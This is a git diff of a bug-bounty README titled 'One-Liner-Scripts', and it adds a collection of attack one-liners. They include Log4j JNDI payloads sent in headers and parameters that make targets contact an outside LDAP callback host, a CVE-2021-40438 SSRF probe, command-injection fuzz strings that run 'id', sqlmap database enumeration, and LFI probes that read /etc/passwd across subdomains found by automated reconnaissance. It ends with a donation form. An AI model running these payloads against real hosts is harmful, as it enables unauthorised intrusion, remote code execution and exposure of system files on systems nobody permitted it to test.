@@ -1,5 +1,5 @@
 # One-Liner-Scripts
-A collection of awesome one-liner scripts especially for bug bounty.
+***A collection of awesome one-liner scripts especially for bug bounty.***
 
 
 **XSS**
@@ -121,7 +121,7 @@ cat main.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' |
 **Command Injection**
 
 ```
-cat subdomains.txt | httpx | gau | qsreplace “aaa%20%7C%7C%20id%3B%20x” > fuzzing.txt
+subfinder -d target.com | httpx | gau | qsreplace “aaa%20%7C%7C%20id%3B%20x” > fuzzing.txt
 ```
 ```
 ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
@@ -130,7 +130,63 @@ ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
 **Log4j**
 
 ```
-subfinder -d example.com -silent |puredns resolve -q |httprobe | while read url; do case1=$(curl -s $url -H "X-Api-Version: ${jndi:ldap://Yourburpcolab/a}"); case2=$(curl -s "$url/?test=${jndi:ldap://Yourburpcolab/a}"); case3=$(curl -s $url -H "User-Agent: ${jndi:ldap://Yourburpcolab/a}"); echo -e "\033[43mDOMAIN => $url\033[0m]" "\n" " Case1=> X-Api-Version: running-Ldap-payload" "\n" " Case1=> Useragent: running-Ldap-payload" "\n" " Case1=> $url/?test=running-Ldap-payload" "\n";done
+subfinder -d target.com -silent |puredns resolve -q |httprobe | while read url; do case1=$(curl -s $url -H "X-Api-Version: ${jndi:ldap://Yourburpcolab/a}"); case2=$(curl -s "$url/?test=${jndi:ldap://Yourburpcolab/a}"); case3=$(curl -s $url -H "User-Agent: ${jndi:ldap://Yourburpcolab/a}"); echo -e "\033[43mDOMAIN => $url\033[0m]" "\n" " Case1=> X-Api-Version: running-Ldap-payload" "\n" " Case1=> Useragent: running-Ldap-payload" "\n" " Case1=> $url/?test=running-Ldap-payload" "\n";done
+```
+
+**SQLi**
+
+```
+sqlmap -u "https://target" --header="X-Forwarded-For: 1*" --dbs --batch --random-agent --threads=10 
+```
+
+**CVE-2021-44228**
+
+```
+cat subdomains.txt | while read host do; do curl -sk --insecure --path-as-is "$host/?test=${jndi:ldap://log4j.requestcatcher.com/a}" -H "X-Api-Version: ${jndi:ldap://log4j.requestcatcher.com/a}" -H "User-Agent: ${jndi:ldap://log4j.requestcatcher.com/a}";done
+```
+
+**LFI**
+
+```
+subfinder -d target.com | httpx -follow-redirects -title -path /api/geojson?url=file:///etc/passwd -match-string "root:x:0:0"
+```
+
+**CVE-2021-40438**
+
+```
+cat file.txt | while read host do;do curl --path-as-is --insecure "$host/?unix:(7701 A's here) | "https://bugbounty.requestcatcher.com/ssrf" | grep "request caught" && echo "$host \033[0;31mVuln\n" || echo "$host \033[0;32mNot\n";done
+```
+
+**RCE**
+
+```
+cat subdomains.txt | httpx | gau | qsreplace “aaa%20%7C%7C%20id%3B%20x” > fuzzing.txt
+```
+```
+ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
+```
+
+**LFI**
+
+```
+gau https://target.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
+```
+
+**Open Redirect**
+
+```
+cat domains.txt | waybackurls | httpx -silent -timeout 2 -threads 100 | gf redirect | anew
 ```
 
 **More Scripts Coming Sooon.....**
+
+***Support Me***
+
+
+<!-- Sample of code generated --> 
+<form action="https://www.paypal.com/paypalme/litt1eb0y" method="post" target="_top">
+<input type="hidden" name="cmd" value="_s-xclick">
+<input type="hidden" name="hosted_button_id" value="RGQ8NSYPA59FL">
+<input type="image" src="https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif" border="0" name="submit" alt="PayPal - The safer, easier way to pay online!">
+<img alt="" border="0" src="https://www.paypalobjects.com/pt_BR/i/scr/pixel.gif" width="1" height="1">
+</form>
